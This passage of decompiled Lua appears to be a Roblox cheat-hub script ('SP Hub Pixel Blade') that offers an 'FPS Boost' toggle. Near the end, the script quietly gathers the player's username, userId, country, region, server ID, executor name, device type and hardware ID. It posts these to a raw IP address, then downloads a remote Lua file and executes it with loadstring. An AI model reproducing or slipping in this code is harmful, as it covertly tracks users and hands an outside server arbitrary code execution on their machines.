                                                                                                    end
                                                                                                end
                                                                                            else
                                                                                                type_name_2 = val_334
                                                                                                enabled_2 = val_335
                                                                                                if enabled_2 ~= nil then
                                                                                                    enabled_2 = enabled_2.Enabled
                                                                                                else
                                                                                                    enabled_2 = nil
                                                                                                end
                                                                                                if type_name_2 then
                                                                                                    type_name_2.Enabled = enabled_2
                                                                                                end
                                                                                            end
                                                                                        else
                                                                                            type_name_2 = val_334
                                                                                            enabled_2 = val_335
                                                                                            if enabled_2 ~= nil then
                                                                                                enabled_2 = enabled_2.Enabled
                                                                                            else
                                                                                                enabled_2 = nil
                                                                                            end
                                                                                            if type_name_2 then
                                                                                                type_name_2.Enabled = enabled_2
                                                                                            end
                                                                                        end
                                                                                    else
                                                                                        type_name_2 = val_334
                                                                                        enabled_2 = val_335
                                                                                        if enabled_2 ~= nil then
                                                                                            enabled_2 = enabled_2.Enabled
                                                                                        else
                                                                                            enabled_2 = nil
                                                                                        end
                                                                                        if type_name_2 then
                                                                                            type_name_2.Enabled = enabled_2
                                                                                        end
                                                                                    end
                                                                                else
                                                                                    type_name_2 = val_334
                                                                                    enabled_2 = val_335
                                                                                    if enabled_2 ~= nil then
                                                                                        enabled_2 = enabled_2.Enabled
                                                                                    else
                                                                                        enabled_2 = nil
                                                                                    end
                                                                                    if type_name_2 then
                                                                                        type_name_2.Enabled = enabled_2
                                                                                    end
                                                                                end
                                                                            else
                                                                                type_name_2 = val_334
                                                                                enabled_2 = val_335
                                                                                if enabled_2 ~= nil then
                                                                                    enabled_2 = enabled_2.Enabled
                                                                                else
                                                                                    enabled_2 = nil
                                                                                end
                                                                                if type_name_2 then
                                                                                    type_name_2.Enabled = enabled_2
                                                                                end
                                                                            end
                                                                        end
                                                                    else
                                                                        type_name_2 = val_334
                                                                        enabled_2 = val_335
                                                                        if enabled_2 ~= nil then
                                                                            enabled_2 = enabled_2.Transparency
                                                                        else
                                                                            enabled_2 = nil
                                                                        end
                                                                        if type_name_2 then
                                                                            type_name_2.Transparency = enabled_2
                                                                        end
                                                                    end
                                                                end
                                                            else
                                                                type_name_2 = val_334
                                                                enabled_2 = val_335
                                                                if enabled_2 ~= nil then
                                                                    enabled_2 = enabled_2.Enabled
                                                                else
                                                                    enabled_2 = nil
                                                                end
                                                                if type_name_2 then
                                                                    type_name_2.Enabled = enabled_2
                                                                end
                                                            end
                                                        else
                                                            type_name_2 = val_334
                                                            enabled_2 = val_335
                                                            if enabled_2 ~= nil then
                                                                enabled_2 = enabled_2.Enabled
                                                            else
                                                                enabled_2 = nil
                                                            end
                                                            if type_name_2 then
                                                                type_name_2.Enabled = enabled_2
                                                            end
                                                        end
                                                    else
                                                        type_name_2 = val_334
                                                        enabled_2 = val_335
                                                        if enabled_2 ~= nil then
                                                            enabled_2 = enabled_2.Enabled
                                                        else
                                                            enabled_2 = nil
                                                        end
                                                        if type_name_2 then
                                                            type_name_2.Enabled = enabled_2
                                                        end
                                                    end
                                                else
                                                    type_name_2 = val_334
                                                    enabled_2 = val_335
                                                    if enabled_2 ~= nil then
                                                        enabled_2 = enabled_2.Enabled
                                                    else
                                                        enabled_2 = nil
                                                    end
                                                    if type_name_2 then
                                                        type_name_2.Enabled = enabled_2
                                                    end
                                                end
                                            else
                                                type_name_2 = val_334
                                                enabled_2 = val_335
                                                if enabled_2 ~= nil then
                                                    enabled_2 = enabled_2.Enabled
                                                else
                                                    enabled_2 = nil
                                                end
                                                if type_name_2 then
                                                    type_name_2.Enabled = enabled_2
                                                end
                                            end
                                        end
                                    end
                                end
                                return
                            end
                            pcall_12(handler_26)
                        else
                            break
                        end
                    end
                    pcall_13 = val_304
                    get_children_6 = {}
                    if pcall_13 then
                        pcall_13.Lighting = get_children_6
                    end
                    pcall_13 = val_304
                    get_children_6 = {}
                    if pcall_13 then
                        pcall_13.Workspace = get_children_6
                    end
                    pcall_13 = val_303
                    pcall_13()
                end
                return
            end
            if not pcall_11(handler_29) then
                warn_function = warn
                warn_function("FPS Boost Toggle Error: " .. tostring(handler_29))
            end
            return
        end
    end
    handler_16 = "AddToggle"
    add_toggle = handler_13
    if handler_13 then
        handler_15 = handler_13[handler_16]
    else
        handler_15 = nil
    end
    handler_16 = {}
    handler_16.Name = handler("FPS Boost")
    handler_16.Desc = handler("Boosts your frame rate by cleaning graphics cache and disabling unnecessary visual effects.")
    handler_16.Default = false
    fpsboost = "FPSBoost"
    handler_16.Flag = fpsboost
    do
        local val_336 = spawn_3
        fpsboost = function(argument_1)
            val_336(argument_1)
            return
        end
    end
    handler_16.Callback = fpsboost
    handler_15(add_toggle, handler_16)
    tbl_25 = {
        value = tbl_25.value,
    }
    tbl_26 = {
        value = tbl_26.value,
    }
    tbl_27 = {
        value = tbl_27.value,
    }
    tbl_28 = {
        value = tbl_28.value,
    }
    tbl_29 = {
        value = tbl_29.value,
    }
    tbl_30 = {
        value = tbl_30.value,
    }
    tbl_31 = {
        value = tbl_31.value,
    }
    tbl_32 = {
        value = tbl_32.value,
    }
    tbl_33 = {
        value = tbl_33.value,
    }
    tbl_34 = {
        value = tbl_34.value,
    }
    tbl_35 = {
        value = tbl_35.value,
    }
    tbl_36 = {
        value = tbl_36.value,
    }
    tbl_25.value = game
    make_tab = tbl_25.value
    if tbl_25.value then
        tbl_25.value = tbl_25.value.GetService
    else
        tbl_25.value = nil
    end
    tbl_25.value = tbl_25.value(make_tab, "HttpService")
    make_tab = LocalizationService
    make_tab_2 = PlayerService
    tbl_7 = MarketplaceService
    handler_result = game
    info = handler_result
    handler_result = handler_result.GetService
    tbl_26.value = "UserInputService"
    handler_result = handler_result(info, tbl_26.value)
    info = "SP Hub Pixel Blade"
    if make_tab_2 ~= nil then
        tbl_26.value = make_tab_2.LocalPlayer
    else
        tbl_26.value = nil
    end
    tbl_27.value = "http://78.154.103.18:11336/register"
    tbl_28.value = function()
        local type_name_3
        local pcall_14 = identifyexecutor
        if pcall_14 then
            pcall_14 = pcall(identifyexecutor)
            if pcall_14 then
                type_name_3 = type(identifyexecutor)
                if (type_name_3 == "string") then
                    type_name_3 = #identifyexecutor
                    if (0.0 < type_name_3) then
                        return identifyexecutor
                    else
                        pcall_14 = syn
                        if pcall_14 then
                            pcall_14 = "Synapse X"
                            return pcall_14
                        else
                            pcall_14 = KRNL_LOADED
                            if pcall_14 then
                                pcall_14 = "Krnl"
                                return pcall_14
                            else
                                pcall_14 = is_sirhurt_closure
                                if pcall_14 then
                                    pcall_14 = "SirHurt"
                                    return pcall_14
                                else
                                    pcall_14 = pebc_execute
                                    if pcall_14 then
                                        pcall_14 = "ProtoSmasher"
                                        return pcall_14
                                    else
                                        pcall_14 = secure_load
                                        if pcall_14 then
                                            pcall_14 = "Sentinel"
                                            return pcall_14
                                        else
                                            pcall_14 = "Unknown"
                                            return pcall_14
                                        end
                                    end
                                end
                            end
                        end
                    end
                else
                    pcall_14 = syn
                    if pcall_14 then
                        pcall_14 = "Synapse X"
                        return pcall_14
                    else
                        pcall_14 = KRNL_LOADED
                        if pcall_14 then
                            pcall_14 = "Krnl"
                            return pcall_14
                        else
                            pcall_14 = is_sirhurt_closure
                            if pcall_14 then
                                pcall_14 = "SirHurt"
                                return pcall_14
                            else
                                pcall_14 = pebc_execute
                                if pcall_14 then
                                    pcall_14 = "ProtoSmasher"
                                    return pcall_14
                                else
                                    pcall_14 = secure_load
                                    if pcall_14 then
                                        pcall_14 = "Sentinel"
                                        return pcall_14
                                    else
                                        pcall_14 = "Unknown"
                                        return pcall_14
                                    end
                                end
                            end
                        end
                    end
                end
            else
                pcall_14 = syn
                if pcall_14 then
                    pcall_14 = "Synapse X"
                    return pcall_14
                else
                    pcall_14 = KRNL_LOADED
                    if pcall_14 then
                        pcall_14 = "Krnl"
                        return pcall_14
                    else
                        pcall_14 = is_sirhurt_closure
                        if pcall_14 then
                            pcall_14 = "SirHurt"
                            return pcall_14
                        else
                            pcall_14 = pebc_execute
                            if pcall_14 then
                                pcall_14 = "ProtoSmasher"
                                return pcall_14
                            else
                                pcall_14 = secure_load
                                if pcall_14 then
                                    pcall_14 = "Sentinel"
                                    return pcall_14
                                else
                                    pcall_14 = "Unknown"
                                    return pcall_14
                                end
                            end
                        end
                    end
                end
            end
        else
            pcall_14 = syn
            if pcall_14 then
                pcall_14 = "Synapse X"
                return pcall_14
            else
                pcall_14 = KRNL_LOADED
                if pcall_14 then
                    pcall_14 = "Krnl"
                    return pcall_14
                else
                    pcall_14 = is_sirhurt_closure
                    if pcall_14 then
                        pcall_14 = "SirHurt"
                        return pcall_14
                    else
                        pcall_14 = pebc_execute
                        if pcall_14 then
                            pcall_14 = "ProtoSmasher"
                            return pcall_14
                        else
                            pcall_14 = secure_load
                            if pcall_14 then
                                pcall_14 = "Sentinel"
                                return pcall_14
                            else
                                pcall_14 = "Unknown"
                                return pcall_14
                            end
                        end
                    end
                end
            end
        end
    end
    do
        local val_337 = handler_result
        tbl_29.value = function()
            local touch_enabled = val_337
            if touch_enabled ~= nil then
                touch_enabled = touch_enabled.TouchEnabled
            else
                touch_enabled = nil
            end
            if touch_enabled then
                touch_enabled = val_337
                if touch_enabled ~= nil then
                    touch_enabled = touch_enabled.KeyboardEnabled
                else
                    touch_enabled = nil
                end
                if not touch_enabled then
                    touch_enabled = "Mobile"
                    return touch_enabled
                else
                    touch_enabled = val_337
                    if touch_enabled ~= nil then
                        touch_enabled = touch_enabled.GamepadEnabled
                    else
                        touch_enabled = nil
                    end
                    if touch_enabled then
                        touch_enabled = "Console"
                        return touch_enabled
                    else
                        touch_enabled = "Computer"
                        return touch_enabled
                    end
                end
            else
                touch_enabled = val_337
                if touch_enabled ~= nil then
                    touch_enabled = touch_enabled.GamepadEnabled
                else
                    touch_enabled = nil
                end
                if touch_enabled then
                    touch_enabled = "Console"
                    return touch_enabled
                else
                    touch_enabled = "Computer"
                    return touch_enabled
                end
            end
        end
    end
    tbl_30.value = function()
        local get_hwid_2, text_9, val_338
        local pcall_15 = gethwid
        if pcall_15 then
            pcall_15 = pcall
            get_hwid_2 = gethwid
            pcall_15 = pcall_15(get_hwid_2)
            if pcall_15 then
                if get_hwid_2 then
                    text_9 = tostring
                    val_338 = get_hwid_2
                    return text_9(val_338)
                else
                    pcall_15 = syn
                    if pcall_15 then
                        pcall_15 = syn
                        if pcall_15 ~= nil then
                            pcall_15 = pcall_15.get_hwid
                        else
                            pcall_15 = nil
                        end
                        if pcall_15 then
                            pcall_15 = pcall
                            get_hwid_2 = syn
                            if get_hwid_2 ~= nil then
                                get_hwid_2 = get_hwid_2.get_hwid
                            else
                                get_hwid_2 = nil
                            end
                            pcall_15 = pcall_15(get_hwid_2)
                            if pcall_15 then
                                if get_hwid_2 then
                                    text_9 = tostring
                                    val_338 = get_hwid_2
                                    return text_9(val_338)
                                else
                                    pcall_15 = get_hwid
                                    if pcall_15 then
                                        pcall_15 = pcall
                                        get_hwid_2 = get_hwid
                                        pcall_15 = pcall_15(get_hwid_2)
                                        if pcall_15 then
                                            if get_hwid_2 then
                                                text_9 = tostring
                                                val_338 = get_hwid_2
                                                return text_9(val_338)
                                            else
                                                pcall_15 = "unknown"
                                                return pcall_15
                                            end
                                        else
                                            pcall_15 = "unknown"
                                            return pcall_15
                                        end
                                    else
                                        pcall_15 = "unknown"
                                        return pcall_15
                                    end
                                end
                            else
                                pcall_15 = get_hwid
                                if pcall_15 then
                                    pcall_15 = pcall
                                    get_hwid_2 = get_hwid
                                    pcall_15 = pcall_15(get_hwid_2)
                                    if pcall_15 then
                                        if get_hwid_2 then
                                            text_9 = tostring
                                            val_338 = get_hwid_2
                                            return text_9(val_338)
                                        else
                                            pcall_15 = "unknown"
                                            return pcall_15
                                        end
                                    else
                                        pcall_15 = "unknown"
                                        return pcall_15
                                    end
                                else
                                    pcall_15 = "unknown"
                                    return pcall_15
                                end
                            end
                        else
                            pcall_15 = get_hwid
                            if pcall_15 then
                                pcall_15 = pcall
                                get_hwid_2 = get_hwid
                                pcall_15 = pcall_15(get_hwid_2)
                                if pcall_15 then
                                    if get_hwid_2 then
                                        text_9 = tostring
                                        val_338 = get_hwid_2
                                        return text_9(val_338)
                                    else
                                        pcall_15 = "unknown"
                                        return pcall_15
                                    end
                                else
                                    pcall_15 = "unknown"
                                    return pcall_15
                                end
                            else
                                pcall_15 = "unknown"
                                return pcall_15
                            end
                        end
                    else
                        pcall_15 = get_hwid
                        if pcall_15 then
                            pcall_15 = pcall
                            get_hwid_2 = get_hwid
                            pcall_15 = pcall_15(get_hwid_2)
                            if pcall_15 then
                                if get_hwid_2 then
                                    text_9 = tostring
                                    val_338 = get_hwid_2
                                    return text_9(val_338)
                                else
                                    pcall_15 = "unknown"
                                    return pcall_15
                                end
                            else
                                pcall_15 = "unknown"
                                return pcall_15
                            end
                        else
                            pcall_15 = "unknown"
                            return pcall_15
                        end
                    end
                end
            else
                pcall_15 = syn
                if pcall_15 then
                    pcall_15 = syn
                    if pcall_15 ~= nil then
                        pcall_15 = pcall_15.get_hwid
                    else
                        pcall_15 = nil
                    end
                    if pcall_15 then
                        pcall_15 = pcall
                        get_hwid_2 = syn
                        if get_hwid_2 ~= nil then
                            get_hwid_2 = get_hwid_2.get_hwid
                        else
                            get_hwid_2 = nil
                        end
                        pcall_15 = pcall_15(get_hwid_2)
                        if pcall_15 then
                            if get_hwid_2 then
                                text_9 = tostring
                                val_338 = get_hwid_2
                                return text_9(val_338)
                            else
                                pcall_15 = get_hwid
                                if pcall_15 then
                                    pcall_15 = pcall
                                    get_hwid_2 = get_hwid
                                    pcall_15 = pcall_15(get_hwid_2)
                                    if pcall_15 then
                                        if get_hwid_2 then
                                            text_9 = tostring
                                            val_338 = get_hwid_2
                                            return text_9(val_338)
                                        else
                                            pcall_15 = "unknown"
                                            return pcall_15
                                        end
                                    else
                                        pcall_15 = "unknown"
                                        return pcall_15
                                    end
                                else
                                    pcall_15 = "unknown"
                                    return pcall_15
                                end
                            end
                        else
                            pcall_15 = get_hwid
                            if pcall_15 then
                                pcall_15 = pcall
                                get_hwid_2 = get_hwid
                                pcall_15 = pcall_15(get_hwid_2)
                                if pcall_15 then
                                    if get_hwid_2 then
                                        text_9 = tostring
                                        val_338 = get_hwid_2
                                        return text_9(val_338)
                                    else
                                        pcall_15 = "unknown"
                                        return pcall_15
                                    end
                                else
                                    pcall_15 = "unknown"
                                    return pcall_15
                                end
                            else
                                pcall_15 = "unknown"
                                return pcall_15
                            end
                        end
                    else
                        pcall_15 = get_hwid
                        if pcall_15 then
                            pcall_15 = pcall
                            get_hwid_2 = get_hwid
                            pcall_15 = pcall_15(get_hwid_2)
                            if pcall_15 then
                                if get_hwid_2 then
                                    text_9 = tostring
                                    val_338 = get_hwid_2
                                    return text_9(val_338)
                                else
                                    pcall_15 = "unknown"
                                    return pcall_15
                                end
                            else
                                pcall_15 = "unknown"
                                return pcall_15
                            end
                        else
                            pcall_15 = "unknown"
                            return pcall_15
                        end
                    end
                else
                    pcall_15 = get_hwid
                    if pcall_15 then
                        pcall_15 = pcall
                        get_hwid_2 = get_hwid
                        pcall_15 = pcall_15(get_hwid_2)
                        if pcall_15 then
                            if get_hwid_2 then
                                text_9 = tostring
                                val_338 = get_hwid_2
                                return text_9(val_338)
                            else
                                pcall_15 = "unknown"
                                return pcall_15
                            end
                        else
                            pcall_15 = "unknown"
                            return pcall_15
                        end
                    else
                        pcall_15 = "unknown"
                        return pcall_15
                    end
                end
            end
        else
            pcall_15 = syn
            if pcall_15 then
                pcall_15 = syn
                if pcall_15 ~= nil then
                    pcall_15 = pcall_15.get_hwid
                else
                    pcall_15 = nil
                end
                if pcall_15 then
                    pcall_15 = pcall
                    get_hwid_2 = syn
                    if get_hwid_2 ~= nil then
                        get_hwid_2 = get_hwid_2.get_hwid
                    else
                        get_hwid_2 = nil
                    end
                    pcall_15 = pcall_15(get_hwid_2)
                    if pcall_15 then
                        if get_hwid_2 then
                            text_9 = tostring
                            val_338 = get_hwid_2
                            return text_9(val_338)
                        else
                            pcall_15 = get_hwid
                            if pcall_15 then
                                pcall_15 = pcall
                                get_hwid_2 = get_hwid
                                pcall_15 = pcall_15(get_hwid_2)
                                if pcall_15 then
                                    if get_hwid_2 then
                                        text_9 = tostring
                                        val_338 = get_hwid_2
                                        return text_9(val_338)
                                    else
                                        pcall_15 = "unknown"
                                        return pcall_15
                                    end
                                else
                                    pcall_15 = "unknown"
                                    return pcall_15
                                end
                            else
                                pcall_15 = "unknown"
                                return pcall_15
                            end
                        end
                    else
                        pcall_15 = get_hwid
                        if pcall_15 then
                            pcall_15 = pcall
                            get_hwid_2 = get_hwid
                            pcall_15 = pcall_15(get_hwid_2)
                            if pcall_15 then
                                if get_hwid_2 then
                                    text_9 = tostring
                                    val_338 = get_hwid_2
                                    return text_9(val_338)
                                else
                                    pcall_15 = "unknown"
                                    return pcall_15
                                end
                            else
                                pcall_15 = "unknown"
                                return pcall_15
                            end
                        else
                            pcall_15 = "unknown"
                            return pcall_15
                        end
                    end
                else
                    pcall_15 = get_hwid
                    if pcall_15 then
                        pcall_15 = pcall
                        get_hwid_2 = get_hwid
                        pcall_15 = pcall_15(get_hwid_2)
                        if pcall_15 then
                            if get_hwid_2 then
                                text_9 = tostring
                                val_338 = get_hwid_2
                                return text_9(val_338)
                            else
                                pcall_15 = "unknown"
                                return pcall_15
                            end
                        else
                            pcall_15 = "unknown"
                            return pcall_15
                        end
                    else
                        pcall_15 = "unknown"
                        return pcall_15
                    end
                end
            else
                pcall_15 = get_hwid
                if pcall_15 then
                    pcall_15 = pcall
                    get_hwid_2 = get_hwid
                    pcall_15 = pcall_15(get_hwid_2)
                    if pcall_15 then
                        if get_hwid_2 then
                            text_9 = tostring
                            val_338 = get_hwid_2
                            return text_9(val_338)
                        else
                            pcall_15 = "unknown"
                            return pcall_15
                        end
                    else
                        pcall_15 = "unknown"
                        return pcall_15
                    end
                else
                    pcall_15 = "unknown"
                    return pcall_15
                end
            end
        end
    end
    tbl_31.value = "Unknown"
    tbl_32.value = pcall
    do
        local capture_1_361985, val_339, capture_1_361987 = tbl_31, make_tab, tbl_26
        tbl_33.value = function()
            local get_country_region_for_player_async = val_339
            local val_340 = get_country_region_for_player_async
            if get_country_region_for_player_async then
                get_country_region_for_player_async = get_country_region_for_player_async.GetCountryRegionForPlayerAsync
            else
                get_country_region_for_player_async = nil
            end
            capture_1_361985.value = get_country_region_for_player_async(val_340, capture_1_361987.value)
            return
        end
    end
    tbl_32.value(tbl_33.value)
    tbl_32.value = "Unknown"
    tbl_33.value = pcall
    do
        local capture_1_363777, capture_1_363778 = tbl_26, tbl_32
        tbl_34.value = function()
            local string_3, val_341, value_21
            local locale_id = capture_1_363777.value
            if locale_id ~= nil then
                locale_id = locale_id.LocaleId
            else
                locale_id = nil
            end
            if locale_id then
                string_3 = string
                if string_3 ~= nil then
                    string_3 = string_3.find
                else
                    string_3 = nil
                end
                val_341 = locale_id
                value_21 = "_"
                string_3 = string_3(val_341, value_21)
                if string_3 then
                    string_3 = string
                    if string_3 ~= nil then
                        string_3 = string_3.split
                    else
                        string_3 = nil
                    end
                    val_341 = locale_id
                    value_21 = "_"
                    string_3 = string_3(val_341, value_21)
                    if string_3 ~= nil then
                        string_3 = string_3[2.0]
                    else
                        string_3 = nil
                    end
                    if not string_3 then
                        string_3 = "Unknown"
                    end
                    capture_1_363778.value = string_3
                end
            end
            return
        end
    end
    tbl_33.value(tbl_34.value)
    tbl_33.value = "Unknown"
    tbl_34.value = pcall
    do
        local val_342, capture_1_365314 = tbl_7, tbl_33
        handler_13 = function()
            local get_product_info = val_342
            local name_4 = get_product_info
            if get_product_info then
                get_product_info = get_product_info.GetProductInfo
            else
                get_product_info = nil
            end
            local place_id_2 = game.PlaceId
            get_product_info = get_product_info(name_4, place_id_2)
            if get_product_info then
                if get_product_info ~= nil then
                    name_4 = get_product_info.Name
                else
                    name_4 = nil
                end
                capture_1_365314.value = name_4
            end
            return
        end
    end
    tbl_34.value(handler_13)
    tbl_34.value = tbl_28.value
    tbl_34.value = tbl_34.value()
    handler_13 = (tbl_29.value)()
    tbl_35.value = tbl_30.value
    tbl_35.value = tbl_35.value()
    handler_14 = {}
    tbl_36.value = "username"
    if tbl_26.value ~= nil then
        handler_result_2 = tbl_26.value.Name
    else
        handler_result_2 = nil
    end
    if handler_14 then
        handler_14[tbl_36.value] = handler_result_2
    end
    tbl_36.value = "userId"
    handler_result_2 = "UserId"
    if tbl_26.value ~= nil then
        handler_result_2 = tbl_26.value[handler_result_2]
    else
        handler_result_2 = nil
    end
    if handler_14 then
        handler_14[tbl_36.value] = handler_result_2
    end
    tbl_36.value = "country"
    if handler_14 then
        handler_14[tbl_36.value] = tbl_31.value
    end
    tbl_36.value = "state"
    if handler_14 then
        handler_14[tbl_36.value] = tbl_32.value
    end
    handler_14.game = tbl_33.value
    tbl_36.value = "server"
    handler_result_2 = game.JobId
    if handler_14 then
        handler_14[tbl_36.value] = handler_result_2
    end
    tbl_36.value = "placeId"
    handler_result_2 = tostring(game.PlaceId)
    if handler_14 then
        handler_14[tbl_36.value] = handler_result_2
    end
    tbl_36.value = os
    if tbl_36.value ~= nil then
        tbl_36.value = tbl_36.value.date
    else
        tbl_36.value = nil
    end
    tbl_36.value = tbl_36.value("!%Y-%m-%dT%H:%M:%SZ")
    handler_14.time = tbl_36.value
    tbl_36.value = "execution"
    if handler_14 then
        handler_14[tbl_36.value] = true
    end
    tbl_36.value = "executor"
    if handler_14 then
        handler_14[tbl_36.value] = tbl_34.value
    end
    tbl_36.value = "script"
    if handler_14 then
        handler_14[tbl_36.value] = info
    end
    tbl_36.value = "device"
    if handler_14 then
        handler_14[tbl_36.value] = handler_13
    end
    tbl_36.value = "hwid"
    if handler_14 then
        handler_14[tbl_36.value] = tbl_35.value
    end
    do
        local capture_1_378625, val_343, val_344 = tbl_25, handler_14, tbl_27
        tbl_36.value = function()
            local handler_30
            local jsonencode = capture_1_378625.value
            local tbl_58 = jsonencode
            if jsonencode then
                jsonencode = jsonencode.JSONEncode
            else
                jsonencode = nil
            end
            jsonencode = jsonencode(tbl_58, val_343)
            tbl_58 = {
                ['Content-Type'] = "application/json",
            }
            local http_enabled = capture_1_378625.value
            if http_enabled ~= nil then
                http_enabled = http_enabled.HttpEnabled
            else
                http_enabled = nil
            end
            if http_enabled then
                http_enabled = pcall
                local capture_164_3073_2, capture_164_3074_2, val_345, val_346 = capture_1_378625, val_344, jsonencode, tbl_58
                handler_30 = function()
                    local post_async = capture_164_3073_2.value
                    local val_347 = post_async
                    if post_async then
                        post_async = post_async.PostAsync
                    else
                        post_async = nil
                    end
                    local val_348 = capture_164_3074_2.value
                    local val_349 = val_345
                    local http_content_type = Enum.HttpContentType
                    if http_content_type ~= nil then
                        http_content_type = http_content_type.ApplicationJson
                    else
                        http_content_type = nil
                    end
                    local val_350 = val_346
                    post_async(val_347, val_348, val_349, http_content_type, false, val_350)
                    return
                end
                http_enabled(handler_30)
            end
            http_enabled = ipairs
            handler_30 = {}
            local val_351 = http_request
            local http_enabled_result = request
            local request_3 = syn
            if request_3 then
                request_3 = syn
                if request_3 ~= nil then
                    request_3 = request_3.request
                else
                    request_3 = nil
                end
            end
            local request_4 = http
            if request_4 then
                request_4 = http
                if request_4 ~= nil then
                    request_4 = request_4.request
                else
                    request_4 = nil
                end
            end
            local request_5 = fluxus
            if request_5 then
                request_5 = fluxus
                if request_5 ~= nil then
                    request_5 = request_5.request
                else
                    request_5 = nil
                end
            end
            handler_30[1] = val_351
            handler_30[2] = http_enabled_result
            handler_30[3] = request_3
            handler_30[4] = request_4
            handler_30[5] = request_5
            http_enabled = http_enabled(handler_30)
            while true do
                http_enabled_result = http_enabled(handler_30, val_351)
                if http_enabled_result ~= nil then
                    val_351 = http_enabled_result
                    if request_3 then
                        request_4 = pcall
                        local val_352, capture_164_11010_2, val_353, val_354 = request_3, val_344, tbl_58, jsonencode
                        request_5 = function()
                            local val_355 = val_352
                            local tbl_59 = {}
                            tbl_59.Url = capture_164_11010_2.value
                            tbl_59.Method = "POST"
                            tbl_59.Headers = val_353
                            tbl_59.Body = val_354
                            val_355(tbl_59)
                            return
                        end
                        request_4(request_5)
                        break
                    end
                else
                    break
                end
            end
            return
        end
    end
    ;
    (task.spawn)(tbl_36.value)
    ;
    (task.spawn)(function()
        local protected_call_3 = pcall
        protected_call_3(function()
            local pack_result_95
            local loadstring_function = loadstring
            local game_5 = game
            local pack_result_96
            local pack_result_97 = pack(game_5:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a33199ea4226d7235310459"))
            if pack_result_97.n >= 1 then
                game_5 = pack_result_97[1]
            end
            if pack_result_97.n >= 2 then
                pack_result_96 = pack_result_97[2]
            end
            if pack_result_97.n >= 3 then
                pack_result_95 = pack_result_97[3]
            end
            ;
            (loadstring_function(unpack(pack_result_97, 1, pack_result_97.n)))()
            return
        end)
        return
    end)
    tbl_25 = {
        value = tbl_25.value,
    }
    tbl_26 = {
        value = tbl_26.value,
    }
    tbl_27 = {
        value = tbl_27.value,
    }
    tbl_28 = {
        value = tbl_28.value,
    }
    tbl_29 = {
        value = tbl_29.value,
    }
    tbl_30 = {
        value = tbl_30.value,
    }
    tbl_31 = {
        value = tbl_31.value,
    }
    tbl_32 = {
        value = tbl_32.value,
    }
    tbl_33 = {
        value = tbl_33.value,
    }
    tbl_34 = {
        value = tbl_34.value,
    }
    tbl_35 = {
        value = tbl_35.value,
    }
    tbl_36 = {
        value = tbl_36.value,
    }
    return
end
return runRecoveredSource(...)
